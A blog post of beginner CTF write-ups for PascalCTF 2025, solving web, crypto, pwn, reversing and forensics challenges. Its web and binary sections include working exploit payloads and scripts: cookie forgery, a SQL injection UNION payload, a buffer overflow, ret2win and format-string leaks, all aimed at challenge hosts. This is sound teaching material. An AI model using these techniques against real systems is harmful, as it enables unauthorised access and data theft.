---
title: "Pascal CTF Beginner 2025"
date: 2025-03-26T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["pascalCTF", "ctf", "binary", "crypto", "web", "pascalCTF2025"]
author: "AlBovo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Some writeups of the pascalCTF Beginner ctf 2025 edition."
canonicalURL: "https://albovo.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "Pascal CTF Beginner 2025" # alt text
    caption: "Some writeups of the pascalCTF Beginner ctf 2025 edition." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

# Pascal CTF Beginner 2025
![pascalCTF logo](/images/pascalCTF.png)

## Web 🌐
### Static Fl@g
This challenge is one of the simplest in web security, as it relies on a client-side check to reveal the actual flag. The flag is embedded in the JavaScript code of the index page, encoded in base64, making it easy to locate with a bit of inspection.
Therefore there isn't any need to create a script to solve this challenge.

### Biscotto
Biscotto's backend contains only two functions:

* The `/login` endpoint, which allows users to log in as long as the username is not 'admin'.
* The `/me` endpoint, which displays the flag if the user is 'admin'.

![js code of the server](/images/biscottoCode.png)

The flag can therefore be found with this command:
```sh
#!/bin/sh
curl --cookie "user=admin" https://biscotto.challs.pascalctf.it/me
```

The vulnerability lies in the **me** function, where the session cookie, which is not encrypted, is used to verify the actual username. To obtain the flag, one simply needs to modify the 'user' cookie, setting its value to *admin* to access the flag

### Euro2024
The challenge involves a web application that provides statistics for different groups participating in a tournament. The objective is to exploit an SQL Injection vulnerability to extract the flag.

The provided solution uses an SQL Injection attack to retrieve the flag from the database. Below is the breakdown of the approach:

#### 1. Understanding the Vulnerability
The endpoint `/api/group-stats` appears to be vulnerable to SQL Injection. The input parameter `group` is directly embedded into an SQL query without proper sanitization.

#### 2. Crafting the Payload
The payload used to exploit the vulnerability is:

```sql
' UNION SELECT flag, null, null, null, null, null, null, null FROM FLAG; -- -
```

This payload:
- Breaks out of the existing query context using `' UNION SELECT`.
- Selects the `flag` column from the `FLAG` table.
- Uses `null` values to match the expected number of columns.
- Comments out the rest of the SQL query to prevent syntax errors.

This is the actual code used also by the checker:
```python
#!/usr/bin/env python3
import requests
URL = 'http://localhost:8002'
PAYLOAD = "' UNION SELECT flag" + ", null" * 7 + " FROM FLAG; -- -"

r = requests.post(URL + '/api/group-stats', data={'group' : PAYLOAD})
print(r.json()['data'][0]['group_id'])```
```

## Cryptography 🔒
### Romañs Empyre
This challenge `"encrypts"` the flag in a very simple way, **randomly** choosing a key used to encode the flag using the [`Caesar Cipher`](https://en.wikipedia.org/wiki/Caesar_cipher). The result of this encryption can be found in `output.txt` and can be decrypted using [`cyberchef.org`](https://gchq.github.io/CyberChef/) or by using the Python writeup attached to this challenge.

```py
#!/usr/bin/env python3
import string
alphabet = string.ascii_letters + string.digits + "{}_-.,/%?$!@#"

def romanize(input_string):
    for key in range(1, len(alphabet)):
        result = [""] * len(input_string)
        for i, c in enumerate(input_string):
            result[i] = alphabet[(alphabet.index(c) + key) % len(alphabet)]
        result = "".join(result)

        if "pascalCTF{" in result:
            return result

if __name__ == "__main__":
    enc_flag = open("output.txt", "r").read().strip()
    print(romanize(enc_flag))
```

### MindBlowing
This challenge offers a service that computes the **bitwise AND** between a sentence (likely the flag) and a series of integers provided by the user. To make everything more interesting, each integer must have no more than *40 bits set to 1*. Once the calculations are done, the challenge outputs an array of results.


There are several strategies to solve this challenge. One approach involves sending approximately **15 integers**, each with 40 consecutive bits set to 1, and progressively *right-shifted* by `40 * x`, where `x` is the index of the integer. Afterward, the flag can be recovered by computing the *bitwise OR* of the results array and converting the resulting integer to bytes (in big-endian order, of course). 

```py
#!/usr/bin/env python3
from Crypto.Util.number import *
from pwn import *

# connect to the server
r = remote('0.0.0.0', 420)

# Bypass menu questions
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(b'15') # 40 * 10

# send masks to get 40 bits of the flag at a time
for _ in range(15):
    r.recvuntil(b': ')
    r.sendline(str(((1 << 40) - 1) << (40 * _)).encode())

flag = 0
# get the flag
r.recvuntil(b'[')
for _ in range(15):
    flag |= int(r.recvuntil(b',')[:-1].decode())

# print the flag
print(long_to_bytes(flag).decode())
```

### My favourite number
This challenge provides an output file, which contains a conversation between Alice and Bob **encrypted with RSA**, where Bob guesses Alice's favourite number, by doing a binary search. For each message Alice responds with a yes or no answer to the question is your number larger than X? Until the correct one is found, this number is `long_to_bytes()` of the flag

The key insight is that we can encrypt, using Bob's public key the message that Alice would send for both the affirmative and negative case and check which one matches, following the whole conversation and finding out the value

```py
#!/usr/bin/env python3
from Crypto.Util.number import getPrime,bytes_to_long,long_to_bytes

f=open("output.txt","r")

n= #bob_n
e=65537

def sendToBob(msg):
    pt=bytes_to_long(msg.encode())
    ct=pow(pt,e,n)
    return f"alice: {ct}"

#skip first messages
for i in range(7):
    f.readline()

upperbound=2**501
lowerbound=0
while(upperbound-lowerbound>1):
    mid=(upperbound+lowerbound)//2
    f.readline()
    response=f.readline()
    if(response.strip()==sendToBob(f"Yes!, my number is greater than {mid}")):
        lowerbound=mid
    else:
        upperbound=mid

#print the flag
print(long_to_bytes(upperbound).decode())
```

## Binary Exploitation 💻
### Morris Worm
This challenge reads 1337 characters from **stdin** and stores them in an **array of chars**, it then checks if a variable is 1337 and if so we get the flag, the problem is that the value of the variable is 69 and it doesn't change.
The array of chars, however, is only **44 bytes long** and we can write more than that, so it is vulnerable to **buffer-overflow**, we just need to fill the array and then insert 1337 using [p32](https://docs.pwntools.com/en/stable/util/packing.html) to correctly **overwrite the variable**.
It is also possible to exploit the challenge using a ret2win attack, leveraging the buffer overflow vulnerability and the absence of PIE (Position Independent Executable) in the binary.

```py
#!/usr/bin/env python3
from pwn import *

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1337) # change host and port
else:
    r = process('./pwn1')

PAYLOAD = b'A' * 44 + p32(1337)
r.recvuntil(b'?\n')
r.sendline(PAYLOAD + b'\x00')

r.interactive()
```

### Unpwnable Shop
This challenge lets us **insert our name** to access the shop. looking closely we can see that the **limit** of our input is positioned just after our name in the **stack** and also its initial value is 81! just enough to insert our name and **overwrite the limit** for later.
After inserting our name the program asks us what do we want to do, if we answer 69 we access a unique dialogue that makes us **re-input our name**, but this time the limit is whatever we inserted before, so if we send 88 bytes (76 for the username, 4 for the limit and 8 for the rbp), and the **address of the 'win' function** we successfully **overwrite** the return address and get the flag.

**Vulnerability**: [ret2win](https://book.hacktricks.xyz/binary-exploitation/stack-overflow/ret2win)

```py
#!/usr/bin/env python3
from pwn import remote, args, ELF, p64, p32

elf = ELF("./unpwnable")
if args.REMOTE:
    r = remote('localhost', 1338) #Change host and port
else:
    r = elf.process()

# Overwriting limit
r.recvuntil(b':')
r.sendline(b'a' * 76 + p32(96))

# Sending right choice
r.recvuntil(b'stuff')
r.sendline(b'69')

#Overwriting return address
r.recvuntil(b'it.')
r.sendline(b'a'*88 + p64(elf.sym['win']))
r.recvuntil(b'Bye!\n')

#Flag!
r.interactive()
```

### E.L.I.A
This challenge first reads the flag from the file `flag.txt` and saves it on the **stack**. Then, it requests input from the user and subsequently prints it insecurely using `printf` without any **defined format**.

This executable can therefore be exploited if the correct offsets on the stack of the flag (from 8 to 13) are found and used together with `%p` in the format `%x$p` where *x* is the offset.

```py
#!/usr/bin/env python3
from pwn import args, remote, process

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1339) # change host and port
else:
    r = process('./elia')

r.recvuntil(b'?\n')
PAYLOAD = b''
for i in range(8, 13):
    PAYLOAD += f'%{i}$p'.encode()

r.sendline(PAYLOAD)
flag = [int(i, 16) for i in r.recvline().decode().split('0x')[1:]]
pascal = ''
for i in flag:
    pascal += i.to_bytes(8, 'little').decode()

pascal = pascal.replace('\x00', '')
print(pascal)
```

## Reverse Engineering ⚙️
### X-Ray
This challenge reads a "*license*" and then checks whenever its valid.
The main issue here it's that the encryption of the license was made using **XOR**, so the it can be decrypted as follows.

```py
#!/usr/bin/env python3
def xor(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

KEY = "*7^tVr4FZ#7S4RFNd2"
ENC = "xR\x08G$G\x07\x19kPhgCa5~\t\x01"

flag = xor(KEY.encode(), ENC.encode()).decode()
print(f"pascalCTF{{{flag}}}")
```

### Switcharoo
This challenge involves a straightforward flag check using a switch-case structure. While the task isn't overly difficult, it does require reversing the code to determine the correct index for each specific character. This can be achieved by analyzing the decompiled code using tools like IDA or Ghidra.

![the decompiled code](/images/switcharoo.png)

P.S.: I personally feel sorry for anyone who actually wasted time trying to solve this (thanks tho).

```py
#!/usr/bin/env python3
flag = ['']*32

flag[1] = flag[4] = flag[11] = 'a'
flag[7] = flag[19] = 'T'
flag[17] = '4'
flag[24] = 'r'
flag[18] = 'n'
flag[3] = flag[16] = 'c'
flag[5] = flag[28] = 'l'
flag[0] = flag[10] = 'p'
flag[2] = 's'
flag[6] = 'C'
flag[21] = 'D'
flag[14] = 'o'
flag[8] = 'F'
flag[13] = flag[30] = 'L'
flag[26] = 'V'
flag[12] = flag[29] = flag[22] = '0'
flag[9] = '{'
flag[118 ^ 0x69] = '}'
flag[15] = flag[20] = flag[23] = flag[27] = '_'
flag[25] = '3'

print(''.join(flag))
```

### KONtAct MI	
This challenge lets us play a game on a gameboy and collect collectibles.
Whenever a collectible is collected, part of a code gets added to our current code; this code, then, can be sent to an admin through a post request for him to evaluate it.

![](/images/kontactmi.png)

The endpoint where the code is sent supports not only POST requests, but also GET requests.
So, if we make a GET request to the same endpoint, it responds with the correct code.
We can then send the correct code to get the flag.

```python
import requests

code = requests.get(f"https://kontactmi.challs.pascalctf.it/adminSupport").json()['response']

flag = requests.post(f"https://kontactmi.challs.pascalctf.it/adminSupport", json={"code":code}).text
print(flag)
```

## Miscellaneous 🧭
### Base N' Hex
This challenge `"encrypts"` the flag in a very simple way, **randomly** choosing whether to encode the flag in *base64* or *hexadecimal* for **10 times**. The result of this encryption can be found in `output.txt` and can be decrypted using [`cyberchef.org`](https://gchq.github.io/CyberChef/) or by using the Python writeup attached to this challenge.

```py
#!/usr/bin/env python3
from base64 import b64decode
flag = open("output.txt", "rb").read()

for i in range(10):
    try:
        if b64decode(flag).isascii():
            flag = b64decode(flag)
        else:
            raise Exception
    except:
        flag = bytes.fromhex(flag.decode())
print(flag.decode())
```

### Romagnol Prometheus
This challenge includes three images representing three Italian locations that can be identified using the **GPS coordinates** saved within the [metadata](https://en.wikipedia.org/wiki/Metadata) of the images. Along with these coordinates, there are also **comments** specifying the type of nuclear bomb that *Mattia* has decided to drop on that location. The goal of the challenge is to discover the location **bombed by all three devices**.

So, the first step to solve the challenge is to extract some data from the images to better understand the next steps.

* Result of the analysis of the first image
![](/images/pascalCTFimage1.png)

* Result of the analysis of the second image
![](/images/pascalCTFimage2.png)

* Result of the analysis of the third image
![](/images/pascalCTFimage3.png)

| Image | Coordinate                         | Bomb              |
|:-----:|------------------------------------|-------------------|
|   1   | 42° 51' 16.74" N, 13° 28' 36.58" E | TSAR 100MT        |
|   2   | 43° 11' 43.22" N, 12° 12' 56.08" E | Castle Bravo 15MT |
|   3   | 44° 8' 28.83" N, 12° 14' 24.84" E  | TSAR 100MT        |

Once the coordinates of the areas to be bombed have been identified, you just need to use [`NukeMap`](https://nuclearsecrecy.com/nukemap/) to note that the blast radius of the various atomic bombs coincides with the unlucky city of Gubbio. Therefore, this name must be entered in the format `pascalCTF{}` to obtain the required flag, i.e., `pascalCTF{gubbio}`.
![result of the bombing](/images/bomb.png)

### DNS e pancetta
This challenge, as could be inferred from its name, involves [DNS Beaconing](https://medium.com/@letshackit/dns-beaconing-definition-and-detection-6a12f975f35e), a technique used by malware and attackers to *exfiltrate* data and send it to their server through **DNS requests**.
![screenshot of wireshark](/images/dnsPancetta.png)
To solve this challenge, it was specifically necessary to split each domain requested by the DNS using the `.` character and extract the first hexadecimal part. Once all the parts were concatenated in *chronological order*, the flag could be obtained simply by converting the hexadecimal text into ASCII.

```py
import pyshark, re

capture = pyshark.FileCapture('misc3.pcapng', display_filter='dns.a') # open file and get all requests
regex = r'pascalCTF{.*?}' # regex to match flag format

flag = ''
for packet in capture:
    query : str = packet.dns.qry_name
    if len(data := query.split('.')) == 3:
        flag += data[0]

flag = bytes.fromhex(flag).decode('utf-8') # convert hex to ascii
print(re.findall(regex, flag)[0]) # print the flag
```